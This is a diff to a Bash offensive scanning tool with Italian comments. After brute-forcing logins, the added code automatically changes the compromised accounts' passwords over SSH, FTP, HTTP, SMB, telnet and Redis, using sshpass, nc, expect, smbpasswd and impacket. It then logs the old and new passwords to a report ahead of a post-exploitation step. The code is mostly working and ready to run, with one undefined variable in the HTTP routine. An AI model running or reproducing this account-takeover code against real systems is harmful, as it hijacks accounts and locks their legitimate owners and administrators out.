@@ -1300,6 +1300,338 @@ _cred_propagate() {
     _cred_store_summary
 }
 
+# ============================================================
+#  CREDENTIAL CHANGE — dopo brute-force, cambia le credenziali
+#  trovate con nuove credenziali e salva tutto nel report
+# ============================================================
+
+_gen_new_pass() {
+    # Genera una nuova password robusta ma memorabile
+    local _adjectives=("Red" "Blue" "Dark" "Fast" "Bold" "Cold" "Hard" "Soft" "Wild" "Neon")
+    local _nouns=("Cobra" "Storm" "Blade" "Ghost" "Shark" "Eagle" "Tiger" "Raven" "Wolf" "Fox")
+    local _adj="${_adjectives[$((RANDOM % ${#_adjectives[@]}))]}"
+    local _noun="${_nouns[$((RANDOM % ${#_nouns[@]}))]}"
+    local _num=$(( (RANDOM % 9000) + 1000 ))
+    local _sym=("!" "@" "#" "$" "%")
+    local _s="${_sym[$((RANDOM % ${#_sym[@]}))]}"
+    echo "${_adj}${_noun}${_num}${_s}"
+}
+
+_gen_new_user() {
+    # Genera un nuovo username casuale
+    local _pfx=("svc" "usr" "net" "sys" "ops" "dev")
+    local _p="${_pfx[$((RANDOM % ${#_pfx[@]}))]}"
+    local _n=$(( (RANDOM % 900) + 100 ))
+    echo "${_p}${_n}"
+}
+
+_cred_change_ssh() {
+    # Cambia password via SSH con le credenziali trovate
+    local _host="$1" _port="$2" _user="$3" _old_pass="$4" _new_pass="$5"
+    local _result="failed"
+    if command -v sshpass &>/dev/null; then
+        # Tenta cambio password via passwd
+        local _out
+        _out=$(sshpass -p "$_old_pass" ssh \
+            -o StrictHostKeyChecking=no -o ConnectTimeout=8 \
+            -o BatchMode=no -p "$_port" \
+            "${_user}@${_host}" \
+            "echo '${_user}:${_new_pass}' | chpasswd 2>/dev/null || \
+             (echo -e '${_old_pass}\n${_new_pass}\n${_new_pass}' | passwd 2>/dev/null)" \
+            2>/dev/null || true)
+        # Verifica che il cambio sia andato a buon fine tentando login con nuova pass
+        sshpass -p "$_new_pass" ssh \
+            -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
+            -o BatchMode=no -p "$_port" \
+            "${_user}@${_host}" "exit" 2>/dev/null && _result="success"
+    fi
+    echo "$_result"
+}
+
+_cred_change_ftp() {
+    local _host="$1" _port="$2" _user="$3" _old_pass="$4" _new_pass="$5"
+    local _result="unsupported"
+    # FTP non ha un comando standard per cambiare password —
+    # tenta via SITE PASSWD se supportato
+    local _ftp_resp
+    _ftp_resp=$(printf "USER %s\r\nPASS %s\r\nSITE PASSWD %s %s\r\nQUIT\r\n" \
+        "$_user" "$_old_pass" "$_old_pass" "$_new_pass" | \
+        timeout 8 nc -w 6 "$_host" "$_port" 2>/dev/null || true)
+    echo "$_ftp_resp" | grep -qi "200\|Password changed\|PASSWD" && _result="success"
+    echo "$_result"
+}
+
+_cred_change_http() {
+    local _host="$1" _port="$2" _scheme="$3" _user="$4" _old_pass="$5" _new_pass="$6"
+    local _result="failed"
+    local _ins=""; [[ "$_scheme" == "https" ]] && _ins="-k"
+    local _base="${_scheme}://${_host}:${_port}"
+    # Endpoint comuni per cambio password
+    local -a _ep=(
+        "/api/change-password" "/api/v1/change-password" "/changepass"
+        "/change-password" "/api/user/password" "/api/password/change"
+        "/admin/change-password" "/user/change-password" "/account/password"
+        "/api/me/password" "/api/account/password"
+    )
+    local -a _bodies=(
+        "{\"old_password\":\"${_old_pass}\",\"new_password\":\"${_new_pass}\",\"confirm_password\":\"${_new_pass}\"}"
+        "{\"current_password\":\"${_old_pass}\",\"new_password\":\"${_new_pass}\"}"
+        "{\"password\":\"${_old_pass}\",\"newPassword\":\"${_new_pass}\"}"
+        "old_password=${_old_pass}&new_password=${_new_pass}&confirm=${_new_pass}"
+        "current=${_old_pass}&password=${_new_pass}&password_confirm=${_new_pass}"
+    )
+    for _e in "${_ep[@]}"; do
+        for _b in "${_bodies[@]:0:2}"; do
+            local _ct="application/json"
+            echo "$_b" | grep -q "=" && _ct="application/x-www-form-urlencoded"
+            local _code
+            _code=$(curl -s $insecure -o /dev/null -w "%{http_code}" \
+                --user "${_user}:${_old_pass}" --max-time 6 \
+                -X POST -H "Content-Type: ${_ct}" -d "$_b" \
+                "${_base}${_e}" 2>/dev/null || echo "000")
+            if [[ "$_code" == "200" || "$_code" == "204" || "$_code" == "201" ]]; then
+                _result="success"
+                break 2
+            fi
+        done
+    done
+    echo "$_result"
+}
+
+_cred_change_smb() {
+    local _host="$1" _port="$2" _user="$3" _old_pass="$4" _new_pass="$5"
+    local _result="failed"
+    if command -v smbpasswd &>/dev/null; then
+        printf '%s\n%s\n%s\n' "$_old_pass" "$_new_pass" "$_new_pass" | \
+            smbpasswd -r "$_host" -U "$_user" -s 2>/dev/null && _result="success"
+    fi
+    if [[ "$_result" == "failed" ]] && command -v impacket-changepasswd &>/dev/null; then
+        impacket-changepasswd "${_host}/${_user}:${_old_pass}@${_host}" \
+            -newpass "$_new_pass" 2>/dev/null && _result="success"
+    fi
+    echo "$_result"
+}
+
+_cred_change_telnet() {
+    local _host="$1" _port="$2" _user="$3" _old_pass="$4" _new_pass="$5"
+    local _result="failed"
+    if command -v expect &>/dev/null; then
+        local _expect_out
+        _expect_out=$(expect -c "
+            set timeout 10
+            spawn telnet $_host $_port
+            expect -re {(login|Username|user):}
+            send \"${_user}\r\"
+            expect -re {(Password|password):}
+            send \"${_old_pass}\r\"
+            expect -re {[#\$>]}
+            send \"echo '${_user}:${_new_pass}' | chpasswd\r\"
+            expect -re {[#\$>]}
+            send \"passwd ${_user}\r\"
+            expect -re {(New|new).*password}
+            send \"${_new_pass}\r\"
+            expect -re {(Retype|confirm|again)}
+            send \"${_new_pass}\r\"
+            expect -re {[#\$>]}
+            send \"exit\r\"
+            expect eof
+        " 2>/dev/null || true)
+        echo "$_expect_out" | grep -qi "success\|updated\|changed\|passwd:" && _result="success"
+    fi
+    echo "$_result"
+}
+
+_cred_change_redis() {
+    local _host="$1" _port="$2" _user="$3" _old_pass="$4" _new_pass="$5"
+    local _result="failed"
+    local _auth_cmd=""
+    [[ -n "$_old_pass" ]] && _auth_cmd="AUTH ${_old_pass}\r\n"
+    local _resp
+    _resp=$(printf "${_auth_cmd}CONFIG SET requirepass ${_new_pass}\r\nQUIT\r\n" | \
+        timeout 6 nc -w 5 "$_host" "$_port" 2>/dev/null || true)
+    echo "$_resp" | grep -q "+OK" && _result="success"
+    echo "$_result"
+}
+
+_cred_change_mqtt() {
+    local _host="$1" _port="$2" _user="$3" _old_pass="$4" _new_pass="$5"
+    # MQTT non ha un protocollo per cambiare password —
+    # se è mosquitto potremmo modificare il file via SSH, ma è fuori scope qui
+    echo "unsupported"
+}
+
+_cred_change() {
+    # Dispatcher: sceglie il metodo giusto in base al servizio
+    # Ritorna "success|failed|unsupported" e stampa new_pass se success
+    local _service="$1" _host="$2" _port="$3" _user="$4" _old_pass="$5" _new_pass="$6"
+    case "$_service" in
+        ssh)        _cred_change_ssh     "$_host" "$_port" "$_user" "$_old_pass" "$_new_pass" ;;
+        ftp)        _cred_change_ftp     "$_host" "$_port" "$_user" "$_old_pass" "$_new_pass" ;;
+        http|https) _cred_change_http    "$_host" "$_port" "$_service" "$_user" "$_old_pass" "$_new_pass" ;;
+        smb)        _cred_change_smb     "$_host" "$_port" "$_user" "$_old_pass" "$_new_pass" ;;
+        telnet)     _cred_change_telnet  "$_host" "$_port" "$_user" "$_old_pass" "$_new_pass" ;;
+        redis)      _cred_change_redis   "$_host" "$_port" "$_user" "$_old_pass" "$_new_pass" ;;
+        mqtt)       _cred_change_mqtt    "$_host" "$_port" "$_user" "$_old_pass" "$_new_pass" ;;
+        *)          echo "unsupported" ;;
+    esac
+}
+
+_cred_change_store_update() {
+    # Aggiorna creds.json con il risultato del cambio credenziali
+    local _service="$1" _host="$2" _port="$3" _user="$4" _old_pass="$5" \
+          _new_pass="$6" _status="$7"
+    [[ -z "$CRED_STORE" || ! -f "$CRED_STORE" ]] && return 0
+    export CRED_FILE="$CRED_STORE" C_SERVICE="$_service" C_HOST="$_host" \
+           C_PORT="$_port" C_USER="$_user" C_OLD_PASS="$_old_pass" \
+           C_NEW_PASS="$_new_pass" C_STATUS="$_status"
+    python3 - <<'PYEOF' 2>/dev/null || true
+import json, os, datetime
+f = os.environ['CRED_FILE']
+svc  = os.environ['C_SERVICE']
+hst  = os.environ['C_HOST']
+prt  = os.environ['C_PORT']
+usr  = os.environ['C_USER']
+oldp = os.environ['C_OLD_PASS']
+newp = os.environ['C_NEW_PASS']
+sts  = os.environ['C_STATUS']
+with open(f) as fh:
+    d = json.load(fh)
+for c in d['credentials']:
+    if (c['service'] == svc and c['host'] == hst and
+            c['port'] == prt and c['user'] == usr and c['pass'] == oldp):
+        c['changed']           = (sts == 'success')
+        c['new_pass']          = newp if sts == 'success' else ''
+        c['change_status']     = sts
+        c['change_timestamp']  = datetime.datetime.now().isoformat()
+        break
+with open(f + '.tmp', 'w') as fh:
+    json.dump(d, fh, indent=2)
+os.replace(f + '.tmp', f)
+PYEOF
+    unset CRED_FILE C_SERVICE C_HOST C_PORT C_USER C_OLD_PASS C_NEW_PASS C_STATUS
+}
+
+_cred_change_all() {
+    # Itera tutte le credenziali trovate e tenta di cambiarle
+    local _target="${1:-}"
+    [[ -z "$CRED_STORE" || ! -f "$CRED_STORE" ]] && return 0
+    [[ "$DRY_RUN" -eq 1 ]] && return 0
+
+    local _creds
+    _creds=$(_cred_store_get "*" "$_target")
+    [[ -z "$_creds" ]] && return 0
+
+    section "Credential Change — sostituzione credenziali trovate"
+    local _changed=0 _failed=0 _unsupported=0
+    local _change_log="${OUTDIR_BASE}/cred_changes.txt"
+    {
+        echo "══════════════════════════════════════════════════════════════"
+        echo "  CREDENTIAL CHANGE REPORT — exa-dune v${VERSION}"
+        echo "  Data: $(date)"
+        echo "  Target: ${_target}"
+        echo "══════════════════════════════════════════════════════════════"
+        echo ""
+    } > "$_change_log"
+
+    # Legge creds.json per ottenere service/port oltre a user:pass
+    export CRED_FILE="$CRED_STORE" CRED_TARGET="$_target"
+    local _cred_list
+    _cred_list=$(python3 - 2>/dev/null <<'PYEOF'
+import json, os
+f   = os.environ['CRED_FILE']
+tgt = os.environ.get('CRED_TARGET', '')
+with open(f) as fh:
+    d = json.load(fh)
+for c in d['credentials']:
+    if tgt and c['host'] != tgt:
+        continue
+    # Salta gia cambiati
+    if c.get('changed'):
+        continue
+    print(c['service'] + "\t" + c['host'] + "\t" + str(c['port']) + "\t" + c['user'] + "\t" + c['pass'])
+PYEOF
+) || true
+    unset CRED_FILE CRED_TARGET
+
+    [[ -z "$_cred_list" ]] && log "Nessuna credenziale da modificare" && return 0
+
+    while IFS=$'\t' read -r _svc _hst _prt _usr _pss; do
+        [[ -z "$_usr" ]] && continue
+        local _new_p; _new_p=$(_gen_new_pass)
+        log "  ▶ Tentativo cambio — ${_svc}://${_hst}:${_prt} ${_usr}:${_pss} → nuova: ${_new_p}"
+
+        local _status
+        _status=$(_cred_change "$_svc" "$_hst" "$_prt" "$_usr" "$_pss" "$_new_p")
+
+        case "$_status" in
+            success)
+                found CRITICAL "CRED CHANGE — ${_svc} ${_usr}@${_hst}:${_prt}: password cambiata!"
+                ok "  Vecchia: ${_pss}  →  Nuova: ${_new_p}"
+                _cred_change_store_update "$_svc" "$_hst" "$_prt" "$_usr" "$_pss" "$_new_p" "success"
+                {
+                    echo "[SUCCESS] ${_svc^^} — ${_hst}:${_prt}"
+                    echo "  Username      : ${_usr}"
+                    echo "  Password orig : ${_pss}"
+                    echo "  Password nuova: ${_new_p}"
+                    echo "  Timestamp     : $(date)"
+                    echo ""
+                } >> "$_change_log"
+                ((_changed++)) || true
+                ;;
+            failed)
+                warn "  Cambio fallito su ${_svc} ${_usr}@${_hst}:${_prt}"
+                _cred_change_store_update "$_svc" "$_hst" "$_prt" "$_usr" "$_pss" "" "failed"
+                {
+                    echo "[FAILED]  ${_svc^^} — ${_hst}:${_prt} user=${_usr}"
+                    echo ""
+                } >> "$_change_log"
+                ((_failed++)) || true
+                ;;
+            unsupported)
+                log "  Cambio non supportato su ${_svc}"
+                _cred_change_store_update "$_svc" "$_hst" "$_prt" "$_usr" "$_pss" "" "unsupported"
+                ((_unsupported++)) || true
+                ;;
+        esac
+    done <<< "$_cred_list"
+
+    echo "" >> "$_change_log"
+    echo "Totale: ${_changed} cambiati | ${_failed} falliti | ${_unsupported} non supportati" >> "$_change_log"
+    log "Credential change completato → $_change_log"
+    log "  Cambiati: $_changed | Falliti: $_failed | Non supportati: $_unsupported"
+}
+
+_cred_change_summary() {
+    # Sezione report: mostra vecchie e nuove credenziali
+    [[ -z "$CRED_STORE" || ! -f "$CRED_STORE" ]] && return 0
+    export CRED_FILE="$CRED_STORE"
+    local _count
+    _count=$(python3 -c "
+import json,os
+d=json.load(open(os.environ['CRED_FILE']))
+print(sum(1 for c in d['credentials'] if c.get('changed')))
+" 2>/dev/null || echo 0)
+    [[ "$_count" -eq 0 ]] && return 0
+
+    section "Credenziali modificate ($_count)"
+    python3 - <<'PYEOF' 2>/dev/null || true
+import json, os
+f = os.environ['CRED_FILE']
+with open(f) as fh:
+    d = json.load(fh)
+changed = [c for c in d['credentials'] if c.get('changed')]
+if not changed:
+    print("  Nessuna credenziale modificata")
+    exit()
+print(f"  {'SERVICE':<10} {'HOST':<16} {'PORT':<6} {'USER':<15} {'PASS ORIG':<20} {'PASS NUOVA':<20} {'STATUS'}")
+print(f"  {'-'*10} {'-'*16} {'-'*6} {'-'*15} {'-'*20} {'-'*20} {'-'*10}")
+for c in changed:
+    sts = '✓ changed' if c.get('changed') else c.get('change_status','?')
+    print(f"  {c['service']:<10} {c['host']:<16} {c['port']:<6} {c['user']:<15} {c['pass']:<20} {c.get('new_pass',''):<20} {sts}")
+PYEOF
+    unset CRED_FILE
+}
+
 apply_stealth() {
     if [[ $STEALTH -eq 1 ]]; then
         NMAP_TIMING="-T2"; NMAP_RATE_FAST=300; NMAP_RATE_FULL=500
@@ -11481,6 +11813,13 @@ except: pass
     [[ $DRY_RUN -eq 0 ]] && _cred_propagate "$target"
     [[ $DRY_RUN -eq 0 ]] && _cred_store_summary
 
+    # ── Cambio automatico credenziali trovate ─────────────────────
+    if [[ $DRY_RUN -eq 0 && -s "${CRED_STORE:-}" ]]; then
+        log "Avvio cambio credenziali brute-forced..."
+        _cred_change_all "$target" "$OUTDIR_BASE"
+        _cred_change_summary "$OUTDIR_BASE"
+    fi
+
     # ── Post-exploit rapido se credenziali trovate ────────────────
     if [[ $DRY_RUN -eq 0 && -s "${CRED_STORE:-}" ]]; then
         local _post_dir="$OUTDIR_BASE/post_exploit"
@@ -11750,6 +12089,15 @@ cmd_report() {
             done < "$hfile"
         done < <(find "$outdir" -name "hydra_*.txt" -print0 2>/dev/null | sort -z)
         [[ $has_creds -eq 0 ]] && echo "  (nessuna credenziale trovata)"
+
+        # ── CAMBIO CREDENZIALI ───────────────────────────────
+        _section "CAMBIO CREDENZIALI (post brute-force)"
+        local cc_file="$outdir/cred_changes.txt"
+        if [[ -s "$cc_file" ]]; then
+            cat "$cc_file"
+        else
+            echo "  (nessun cambio credenziale eseguito)"
+        fi
 
         # ── PORTE APERTE ─────────────────────────────────────
         _section "PORTE APERTE"
